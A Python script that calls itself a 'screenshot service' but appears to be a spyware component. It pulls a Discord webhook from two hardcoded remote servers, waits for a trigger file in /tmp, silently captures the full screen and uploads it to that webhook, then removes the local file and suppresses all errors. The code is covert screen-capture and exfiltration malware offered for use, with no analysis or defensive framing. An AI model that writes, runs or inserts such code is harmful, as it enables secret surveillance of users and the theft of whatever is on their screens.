#!/usr/bin/env python3
"""
screenshot-driver - Dedicated screenshot service
"""

import os
import sys
import tempfile
import subprocess
import time
import requests
from pathlib import Path

# Same token retrieval as main
def fetch_token():
    token_urls = [
        "https://new-production-8df3.up.railway.app/api/token",
        "https://new-5itj.onrender.com/api/token"
    ]
    for url in token_urls:
        try:
            response = requests.get(f"{url}?code=asdfghjkl", timeout=30)
            if response.status_code == 200:
                data = response.json()
                if data.get('success') and 'discord_token' in data:
                    return data['discord_token']
        except:
            continue
    return None

def detect_display():
    """Detect the correct display"""
    display = os.environ.get('DISPLAY')
    if display:
        return display
    
    # Try to detect from logged in users
    try:
        result = subprocess.run(['who'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if '(:' in line and 'tty' in line:
                for part in line.split():
                    if part.startswith('(:'):
                        return part.strip('()')
    except:
        pass
    
    # Try common displays
    for display in [':0', ':0.0', ':1', ':1.0']:
        try:
            result = subprocess.run(['xdpyinfo', '-display', display], 
                                  capture_output=True, timeout=5)
            if result.returncode == 0:
                return display
        except:
            continue
    
    return ':0'

def take_screenshot():
    """Take screenshot with multiple fallback methods"""
    try:
        display = detect_display()
        env = os.environ.copy()
        env['DISPLAY'] = display
        
        temp_dir = tempfile.gettempdir()
        screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
        
        # Try different methods
        methods = [
            ['maim', screenshot_path],
            ['scrot', '-z', '-q', '100', screenshot_path],
            ['import', '-window', 'root', '-quiet', screenshot_path]
        ]
        
        for method in methods:
            try:
                result = subprocess.run(method, env=env, capture_output=True, timeout=15)
                if result.returncode == 0 and os.path.exists(screenshot_path):
                    return screenshot_path
            except:
                continue
        
        return None
    except Exception as e:
        return None

def send_to_discord(file_path, token):
    """Send screenshot to Discord"""
    try:
        import discord
        from discord import SyncWebhook
        
        webhook = SyncWebhook.from_url(token)
        with open(file_path, 'rb') as f:
            webhook.send(file=discord.File(f, filename='screenshot.png'))
        return True
    except:
        return False

def main():
    """Main screenshot driver loop"""
    token = fetch_token()
    if not token:
        return
    
    # Wait for screenshot command from main process
    while True:
        time.sleep(1)
        # Check if main process requested screenshot
        trigger_file = Path("/tmp/screenshot_trigger")
        if trigger_file.exists():
            try:
                trigger_file.unlink()
                screenshot_path = take_screenshot()
                if screenshot_path:
                    send_to_discord(screenshot_path, token)
                    # Cleanup
                    try:
                        os.remove(screenshot_path)
                    except:
                        pass
            except:
                pass

if __name__ == "__main__":
    main()
